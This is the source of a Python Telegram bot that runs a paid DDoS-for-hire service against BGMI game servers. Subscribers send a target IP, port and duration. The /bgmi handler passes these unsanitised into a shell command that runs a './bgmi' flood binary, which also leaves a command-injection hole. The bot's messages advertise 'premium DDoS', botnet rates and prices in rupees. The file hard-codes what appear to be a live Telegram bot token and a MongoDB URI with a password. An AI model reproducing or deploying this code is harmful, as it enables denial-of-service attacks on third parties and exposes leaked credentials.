#bgmiddoserpython

import telebot
import subprocess
import logging
import datetime
import os
#import schedule
import time

from keep_alive import keep_alive
keep_alive()
# insert your Telegram bot token here
bot = telebot.TeleBot('7537334155:AAH-ZKG1JXupeUoJtxsSeLhNnI-kNcbeQqI')

#detabase
from pymongo import MongoClient
import certifi

MONGO_URI = 'mongodb+srv://Soul:JYAuvlizhw7wqLOb@soul.tsga4.mongodb.net'

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)

client = MongoClient(MONGO_URI, tlsCAFile=certifi.where())
db = client['soul']
users_collection = db.users
    
# Admin user IDs
admin_id = ["1854133299","6444153490","1742327897","1067846511"]
FORWARD_CHANNEL_ID = -1002181162852
CHANNEL_ID = -1002181162852
error_channel_id = -1002181162852


# File to store allowed user IDs and their subscription expiry
USER_FILE = "users.txt"
SUBSCRIPTION_FILE = "subscriptions.txt"

# File to store command logs
LOG_FILE = "log.txt"

# Define subscription periods in seconds
subscription_periods = {
'1sec': 60,
'1min': 60,
'2min': 120,
'3min': 180,
'4min': 240,
'5min': 300,
'6min': 360,
'7min': 420,
'8min': 480,
'9min': 540,
'10min': 600,
'11min': 660,
'12min': 720,
'13min': 780,
'14min': 840,
'15min': 900,
'16min': 960,
'17min': 1020,
'18min': 1080,
'19min': 1140,
'20min': 1200,
'21min': 1260,
'22min': 1320,
'23min': 1380,
'24min': 1440,
'25min': 1500,
'26min': 1560,
'27min': 1620,
'28min': 1680,
'29min': 1740,
'30min': 1800,
'31min': 1860,
'32min': 1920,
'33min': 1980,
'34min': 2040,
'35min': 2100,
'36min': 2160,
'37min': 2220,
'38min': 2280,
'39min': 2340,
'40min': 2400,
'41min': 2460,
'42min': 2520,
'43min': 2580,
'44min': 2640,
'45min': 2700,
'46min': 2760,
'47min': 2820,
'48min': 2880,
'49min': 2940,
'50min': 3000,
'51min': 3060,
'52min': 3120,
'53min': 3180,
'54min': 3240,
'55min': 3300,
'56min': 3360,
'57min': 3420,
'58min': 3480,
'59min': 3540,
'60min': 3600,
'61min': 3660,
'62min': 3720,
'63min': 3780,
'64min': 3840,
'65min': 3900,
'66min': 3960,
'67min': 4020,
'68min': 4080,
'69min': 4140,
'70min': 4200,
'71min': 4260,
'72min': 4320,
'73min': 4380,
'74min': 4440,
'75min': 4500,
'76min': 4560,
'77min': 4620,
'78min': 4680,
'79min': 4740,
'80min': 4800,
'81min': 4860,
'82min': 4920,
'83min': 4980,
'84min': 5040,
'85min': 5100,
'86min': 5160,
'87min': 5220,
'88min': 5280,
'89min': 5340,
'90min': 5400,
'91min': 5460,
'92min': 5520,
'93min': 5580,
'94min': 5640,
'95min': 5700,
'96min': 5760,
'97min': 5820,
'98min': 5880,
'99min': 5940,
'100min': 6000,
'101min': 6060,
'102min': 6120,
'103min': 6180,
'104min': 6240,
'105min': 6300,
'106min': 6360,
'107min': 6420,
'108min': 6480,
'109min': 6540,
'110min': 6600,
'111min': 6660,
'112min': 6720,
'113min': 6780,
'114min': 6840,
'115min': 6900,
'116min': 6960,
'117min': 7020,
'118min': 7080,
'119min': 7140,
'120min': 7200,
'121min': 7260,
'122min': 7320,
'123min': 7380,
'124min': 7440,
'125min': 7500,
'126min': 7560,
'127min': 7620,
'128min': 7680,
'129min': 7740,
'130min': 7800,
'131min': 7860,
'132min': 7920,
'133min': 7980,
'134min': 8040,
'135min': 8100,
'136min': 8160,
'137min': 8220,
'138min': 8280,
'139min': 8340,
'140min': 8400,
'141min': 8460,
'142min': 8520,
'143min': 8580,
'144min': 8640,
'145min': 8700,
'146min': 8760,
'147min': 8820,
'148min': 8880,
'149min': 8940,
'150min': 9000,
'151min': 9060,
'152min': 9120,
'153min': 9180,
'154min': 9240,
'155min': 9300,
'156min': 9360,
'157min': 9420,
'158min': 9480,
'159min': 9540,
'160min': 9600,
'161min': 9660,
'162min': 9720,
'163min': 9780,
'164min': 9840,
'165min': 9900,
'166min': 9960,
'167min': 10020,
'168min': 10080,
'169min': 10140,
'170min': 10200,
'171min': 10260,
'172min': 10320,
'173min': 10380,
'174min': 10440,
'175min': 10500,
'176min': 10560,
'177min': 10620,
'178min': 10680,
'179min': 10740,
'180min': 10800,
'181min': 10860,
'182min': 10920,
'183min': 10980,
'184min': 11040,
'185min': 11100,
'186min': 11160,
'187min': 11220,
'188min': 11280,
'189min': 11340,
'190min': 11400,
'191min': 11460,
'192min': 11520,
'193min': 11580,
'194min': 11640,
'195min': 11700,
'196min': 11760,
'197min': 11820,
'198min': 11880,
'199min': 11940,
'200min': 12000,
'10min': 600,
'20min': 1200,
'30min': 1800,
'40min': 2400,
'50min': 3000,
'60min': 3600,
'70min': 4200,
'80min': 4800,
'90min': 5400,
'100min': 6000,
'200min': 12000,
'300min': 18000,
'400min': 24000,
'500min': 30000,
'600min': 36000,
'700min': 42000,
'800min': 48000,
'900min': 54000,
'1000min': 60000,
'2000min': 120000,
'3000min': 180000,
'4000min': 240000,
'5000min': 300000,
'6000min': 360000,
'7000min': 420000,
'8000min': 480000,
'9000min': 540000,
'10000min': 600000,
'1hour': 3600,
'6hours': 21600,
'12hours': 43200,
'1day': 86400,
'3days': 259200,
'7days': 604800,
'1month': 2592000,
'2months': 5184000
}


# Function to read user IDs from the file
def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []

# Function to read subscriptions from the file
def read_subscriptions():
    subscriptions = {}
    try:
        with open(SUBSCRIPTION_FILE, "r") as file:
            lines = file.read().splitlines()
            for line in lines:
                parts = line.split()
                if len(parts) >= 2:
                    user_id = parts[0]
                    expiry_str = " ".join(parts[1:])
                    try:
                        expiry = datetime.datetime.strptime(expiry_str, '%Y-%m-%d %H:%M:%S')
                        subscriptions[user_id] = expiry
                    except ValueError:
                        print(f"Error parsing date for user {user_id}: {expiry_str}")
                else:
                    print(f"Invalid line in subscription file: {line}")
    except FileNotFoundError:
        pass
    return subscriptions

# Function to write subscriptions to the file
def write_subscriptions(subscriptions):
    with open(SUBSCRIPTION_FILE, "w") as file:
        for user_id, expiry in subscriptions.items():
            file.write(f"{user_id} {expiry.strftime('%Y-%m-%d %H:%M:%S')}\n")

# List to store allowed user IDs
allowed_user_ids = read_users()
subscriptions = read_subscriptions()

# Function to log command to the file
def log_command(user_id, target, port, time):
    admin_id = ["1854133299"]
    user_info = bot.get_chat(user_id)
    if user_info.username:
        username = "@" + user_info.username
    else:
        username = f"UserID: {user_id}"
    
    with open(LOG_FILE, "a") as file:  # Open in "append" mode
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")

# Function to clear logs
def clear_logs():
    try:
        with open(LOG_FILE, "r+") as file:
            if file.read() == "":
                response = "Logs are already cleared. No data found ❌."
            else:
                file.truncate(0)
                response = "Logs cleared successfully ✅"
    except FileNotFoundError:
        response = "No logs found to clear."
    return response

# Function to record command logs
def record_command_logs(user_id, command, target=None, port=None, time=None):
    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
    if target:
        log_entry += f" | Target: {target}"
    if port:
        log_entry += f" | Port: {port}"
    if time:
        log_entry += f" | Time: {time}"
    
    with open(LOG_FILE, "a") as file:
        file.write(log_entry + "\n")

# Function to check if a user is subscribed
def is_subscribed(user_id):
    if user_id in subscriptions:
        if datetime.datetime.now() < subscriptions[user_id]:
            return True
        else:
            del subscriptions[user_id]
            write_subscriptions(subscriptions)
    return False

# Function to add or update a user's subscription
def add_subscription(user_id, duration):
    expiry = datetime.datetime.now() + datetime.timedelta(seconds=duration)
    subscriptions[user_id] = expiry
    write_subscriptions(subscriptions)

# Command handler for adding a user with approval time
@bot.message_handler(commands=['add'])
def add_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 2:
            user_to_add = command[1]
            period = command[2]
            if period in subscription_periods:
                duration = subscription_periods[period]
                if user_to_add not in allowed_user_ids:
                    allowed_user_ids.append(user_to_add)
                    with open(USER_FILE, "a") as file:
                        file.write(f"{user_to_add}\n")
                add_subscription(user_to_add, duration)
                response = f"User {user_to_add} added with {period} subscription successfully 🎉"
            else:
                response = "Invalid subscription period. Use: 1min, 1hour, 6hours, 12hours, 1day, 3days, 7days, 1month, or 2months🔑."
        else:
            response = "Please specify a User ID and subscription period to add👍."
    else:
        response = "ꜰʀᴇᴇ ᴋᴇ ᴅʜᴀʀᴍ ꜱʜᴀʟᴀ ʜᴀɪ ᴋʏᴀ ᴊᴏ ᴍᴜ ᴜᴛᴛʜᴀ ᴋᴀɪ ᴋʜɪ ʙʜɪ ɢᴜꜱ ʀʜᴀɪ ʜᴏ ʙᴜʏ ᴋʀᴏ ꜰʀᴇᴇ ᴍᴀɪ ᴋᴜᴄʜ ɴʜɪ ᴍɪʟᴛᴀ ʙᴜʏ:- @GumNaamGhs ❄."

    bot.reply_to(message, response)


# Command handler for retrieving user info
@bot.message_handler(commands=['myinfo'])
def get_user_info(message):
    user_id = str(message.chat.id)
    if not is_subscribed(user_id):
        response = "🚫 Your subscription has expired or you are not subscribed. Please renew your subscription to access this service\nDM TO BUY ACCESS:- @GumNaamGhs."
        bot.reply_to(message, response)
        return

    user_info = bot.get_chat(user_id)
    username = user_info.username if user_info.username else "N/A"
    user_role = "Admin" if user_id in admin_id else "User"
    
    if user_id in subscriptions:
        expiry = subscriptions[user_id]
        subscription_status = f"Active until {expiry.strftime('%Y-%m-%d %H:%M:%S')}" if datetime.datetime.now() < expiry else "Expired"
    else:
        subscription_status = "Not Subscribed"
    
    response = (f"👤 Your Info:\n\n"
                f"🆔 User ID: <code>{user_id}</code>\n"
                f"📝 Username: {username}\n"
                f"🔖 Role: {user_role}\n"
                f"📅 Subscription Status: {subscription_status}")
    
    bot.reply_to(message, response, parse_mode="HTML")

# User Remove Command 
@bot.message_handler(commands=['remove'])
def remove_user(message):
    user_id = str(message.chat.id)
    if not is_subscribed(user_id):
        response = "🚫 Your subscription has expired or you are not subscribed. Please renew your subscription to access this service\nDM TO BUY ACCESS:- @GumNaamGhs."
        bot.reply_to(message, response)
        return
    
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_remove = command[1]
            if user_to_remove in allowed_user_ids:
                allowed_user_ids.remove(user_to_remove)
                with open(USER_FILE, "w") as file:
                    for user_id in allowed_user_ids:
                        file.write(f"{user_id}\n")
                if user_to_remove in subscriptions:
                    del subscriptions[user_to_remove]
                    write_subscriptions(subscriptions)
                response = f"User {user_to_remove} removed successfully 👍."
            else:
                response = f"User {user_to_remove} not found in the list ❌."
        else:
            response = '''Please Specify A User ID to Remove. 
✅ Usage: /remove <userid>😘'''
    else:
        response = "ꜰʀᴇᴇ ᴋᴇ ᴅʜᴀʀᴍ ꜱʜᴀʟᴀ ʜᴀɪ ᴋʏᴀ ᴊᴏ ᴍᴜ ᴜᴛᴛʜᴀ ᴋᴀɪ ᴋʜɪ ʙʜɪ ɢᴜꜱ ʀʜᴀɪ ʜᴏ ʙᴜʏ ᴋʀᴏ ꜰʀᴇᴇ ᴍᴀɪ ᴋᴜᴄʜ ɴʜɪ ᴍɪʟᴛᴀ ʙᴜʏ:- @GumNaamGhs ❄."
    
    bot.reply_to(message, response)


@bot.message_handler(commands=['clearlogs'])
def clear_logs_command(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(LOG_FILE, "r+") as file:
                log_content = file.read()
                if log_content.strip() == "":
                    response = "Logs are already cleared. No data found ❌."
                else:
                    file.truncate(0)
                    response = "Logs Cleared Successfully ✅"
        except FileNotFoundError:
            response = "Logs are already cleared ❌."
    else:
        response = "ꜰʀᴇᴇ ᴋᴇ ᴅʜᴀʀᴍ ꜱʜᴀʟᴀ ʜᴀɪ ᴋʏᴀ ᴊᴏ ᴍᴜ ᴜᴛᴛʜᴀ ᴋᴀɪ ᴋʜɪ ʙʜɪ ɢᴜꜱ ʀʜᴀɪ ʜᴏ ʙᴜʏ ᴋʀᴏ ꜰʀᴇᴇ ᴍᴀɪ ᴋᴜᴄʜ ɴʜɪ ᴍɪʟᴛᴀ ʙᴜʏ:- @GumNaamGhs ❄."
    bot.reply_to(message, response)


@bot.message_handler(commands=['clearusers'])
def clear_users_command(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(USER_FILE, "r+") as file:
                log_content = file.read()
                if log_content.strip() == "":
                    response = "USERS are already cleared. No data found ❌."
                else:
                    file.truncate(0)
                    response = "users Cleared Successfully ✅"
        except FileNotFoundError:
            response = "users are already cleared ❌."
    else:
        response = "ꜰʀᴇᴇ ᴋᴇ ᴅʜᴀʀᴍ ꜱʜᴀʟᴀ ʜᴀɪ ᴋʏᴀ ᴊᴏ ᴍᴜ ᴜᴛᴛʜᴀ ᴋᴀɪ ᴋʜɪ ʙʜɪ ɢᴜꜱ ʀʜᴀɪ ʜᴏ ʙᴜʏ ᴋʀᴏ ꜰʀᴇᴇ ᴍᴀɪ ᴋᴜᴄʜ ɴʜɪ ᴍɪʟᴛᴀ ʙᴜʏ:- @GumNaamGhs ❄."
    bot.reply_to(message, response)
 

@bot.message_handler(commands=['allusers'])
def show_all_users(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                if user_ids:
                    response = "Authorized Users:\n"
                    for user_id in user_ids:
                        try:
                            user_info = bot.get_chat(int(user_id))
                            username = user_info.username
                            response += f"- @{username} (ID: {user_id})\n"
                        except Exception as e:
                            response += f"- User ID: {user_id}\n"
                else:
                    response = "No data found ❌"
        except FileNotFoundError:
            response = "No data found ❌"
    else:
        response = "ꜰʀᴇᴇ ᴋᴇ ᴅʜᴀʀᴍ ꜱʜᴀʟᴀ ʜᴀɪ ᴋʏᴀ ᴊᴏ ᴍᴜ ᴜᴛᴛʜᴀ ᴋᴀɪ ᴋʜɪ ʙʜɪ ɢᴜꜱ ʀʜᴀɪ ʜᴏ ʙᴜʏ ᴋʀᴏ ꜰʀᴇᴇ ᴍᴀɪ ᴋᴜᴄʜ ɴʜɪ ᴍɪʟᴛᴀ ʙᴜʏ:- @GumNaamGhs ❄."
    bot.reply_to(message, response)

@bot.message_handler(commands=['logs'])
def show_recent_logs(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
            try:
                with open(LOG_FILE, "rb") as file:
                    bot.send_document(message.chat.id, file)
            except FileNotFoundError:
                response = "No data found ❌."
                bot.reply_to(message, response)
        else:
            response = "No data found ❌"
            bot.reply_to(message, response)
    else:
        response = "ꜰʀᴇᴇ ᴋᴇ ᴅʜᴀʀᴍ ꜱʜᴀʟᴀ ʜᴀɪ ᴋʏᴀ ᴊᴏ ᴍᴜ ᴜᴛᴛʜᴀ ᴋᴀɪ ᴋʜɪ ʙʜɪ ɢᴜꜱ ʀʜᴀɪ ʜᴏ ʙᴜʏ ᴋʀᴏ ꜰʀᴇᴇ ᴍᴀɪ ᴋᴜᴄʜ ɴʜɪ ᴍɪʟᴛᴀ ʙᴜʏ:- @GumNaamGhs ❄."
        bot.reply_to(message, response)


# Function to handle the reply when free users run the /bgmi command
def start_attack_reply(message, target, port, time):
    user_info = message.from_user
    username = user_info.username if user_info.username else user_info.first_name
    
    response = f"{username}, 😈𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃😈\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝 𝐕𝐈𝐏 :- @GumNaamGhs\n𝐂𝐡𝐚𝐧𝐧𝐞𝐥 :- @ArenaCheatOfficial "
    bot.reply_to(message, response)

# Dictionary to store the last time each user ran the /bgmi command
bgmi_cooldown = {}

COOLDOWN_TIME =0

# Handler for /bgmi command
@bot.message_handler(commands=['bgmi'])
def handle_bgmi(message):
    user_id = str(message.chat.id)
    if not is_subscribed(user_id):
        response = "🚫 Your subscription has expired or you are not subscribed. Please renew your subscription to access this service\nDM TO BUY ACCESS:- @GumNaamGhs."
        bot.reply_to(message, response)
        return

    # Rest of the command handler code follows
    if user_id not in allowed_user_ids:
        response = ("🚫 Unauthorized Access! 🚫\n\nOops! It seems like you don't have permission to use the /bgmi command. DM TO BUY ACCESS:- @GumNaamGhs")
        bot.reply_to(message, response)
        return
    
    if user_id not in admin_id:
        if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < COOLDOWN_TIME:
            response = "You Are On Cooldown ❌. Please Wait Before Running The /bgmi Command Again."
            bot.reply_to(message, response)
            return
        bgmi_cooldown[user_id] = datetime.datetime.now()
    
    command = message.text.split()
    if len(command) == 4:
        target = command[1]
        port = int(command[2])
        time = int(command[3])
        if time > 5000:
            response = "Error: Time interval must be less than 80."
        else:
            record_command_logs(user_id, '/bgmi', target, port, time)
            log_command(user_id, target, port, time)
            start_attack_reply(message, target, port, time)
            full_command = f"./bgmi {target} {port} {time} 60"
            process = subprocess.run(full_command, shell=True)
            response = f"BGMI Attack Finished. Target: {target} Port: {port} Time: {time}"
    else:
        response = "✅ Usage :- /bgmi <target> <port> <time>"
    
    bot.reply_to(message, response)




# Add /mylogs command to display logs recorded for bgmi and website commands
@bot.message_handler(commands=['mylogs'])
def show_command_logs(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        try:
            with open(LOG_FILE, "r") as file:
                command_logs = file.readlines()
                user_logs = [log for log in command_logs if f"UserID: {user_id}" in log]
                if user_logs:
                    response = "Your Command Logs:\n" + "".join(user_logs)
                else:
                    response = "❌ No Command Logs Found For You ❌."
        except FileNotFoundError:
            response = "No command logs found."
    else:
        response = "You Are Not Authorized To Use This Command 😡."

    bot.reply_to(message, response)

@bot.message_handler(commands=['help'])
def show_help(message):
    help_text ='''🤖 Available commands:
💥 /bgmi : Method For Bgmi Servers. 
💥 /rules : Please Check Before Use !!.
💥 /mylogs : To Check Your Recents Attacks.
💥 /plan : Checkout Our Botnet Rates.
💥 /myinfo : TO Check Your WHOLE INFO.

🤖 To See Admin Commands:
💥 /admincmd : Shows All Admin Commands.

Buy From :- @GumNaamGhs
Official Channel :- @ArenaCheatOfficial
'''
    for handler in bot.message_handlers:
        if hasattr(handler, 'commands'):
            if message.text.startswith('/help'):
                help_text += f"{handler.commands[0]}: {handler.doc}\n"
            elif handler.doc and 'admin' in handler.doc.lower():
                continue
            else:
                help_text += f"{handler.commands[0]}: {handler.doc}\n"
    bot.reply_to(message, help_text)

@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_name = message.from_user.first_name
    response = f'''❄️ᴡᴇʟᴄᴏᴍᴇ ᴛᴏ ᴘʀᴇᴍɪᴜᴍ ᴅᴅᴏs ʙᴏᴛ, {user_name}! ᴛʜɪs ɪs ʜɪɢʜ ǫᴜᴀʟɪᴛʏ sᴇʀᴠᴇʀ ʙᴀsᴇᴅ ᴅᴅᴏs. ᴛᴏ ɢᴇᴛ ᴀᴄᴄᴇss.
🤖Try To Run This Command : /help 
✅BUY :- @GumNaamGhs
➡️Join :- @ArenaCheatOfficial'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['rules'])
def welcome_rules(message):
    user_name = message.from_user.first_name
    response = f'''{user_name} Please Follow These Rules ⚠️:

1. Dont Run Too Many Attacks !! Cause A Ban From Bot
2. Dont Run 2 Attacks At Same Time Becz If U Then U Got Banned From Bot.
3. MAKE SURE YOU JOINED @ArenaCheatOfficial OTHERWISE NOT WORK
4. We Daily Checks The Logs So Follow these rules to avoid Ban!!'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['plan'])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f'''{user_name}, Brother Only 1 Plan Is Powerfull Then Any Other Ddos !!:

Vip 🌟 :
-> Attack Time : 300 (S)
-> After Attack Limit : 10 sec
-> Concurrents Attack : 5

ℙ𝕣𝕚𝕔𝕖 𝕃𝕚𝕤𝕥💸 : 
𝔻𝕒𝕪-->100 ℝ𝕤 
𝕎𝕖𝕖𝕜-->400 ℝ𝕤 
𝕄𝕠𝕟𝕥𝕙-->1000 ℝ𝕤

𝔻𝕄 :- @GumNaaMghs
'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['admincmd'])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f'''{user_name}, Admin Commands Are Here!!:

💥 /add <userId> : Add a User.
💥 /remove <userid> Remove a User.
💥 /allusers : Authorised Users Lists.
💥 /logs : All Users Logs.
💥 /broadcast : Broadcast a Message.
💥 /clearlogs : Clear The Logs File.
💥 /clearusers : Clear The USERS File.
'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['broadcast'])
def broadcast_message(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split(maxsplit=1)
        if len(command) > 1:
            message_to_broadcast = "⚠️ Message To All Users By Admin:\n\n" + command[1]
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                for user_id in user_ids:
                    try:
                        bot.send_message(user_id, message_to_broadcast)
                    except Exception as e:
                        print(f"Failed to send broadcast message to user {user_id}: {str(e)}")
            response = "Broadcast Message Sent Successfully To All Users 👍."
        else:
            response = "🤖 Please Provide A Message To Broadcast."
    else:
        response = "Only Admin Can Run This Command 😡."

    bot.reply_to(message, response)



#bot.polling()
while True:
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        print(e)

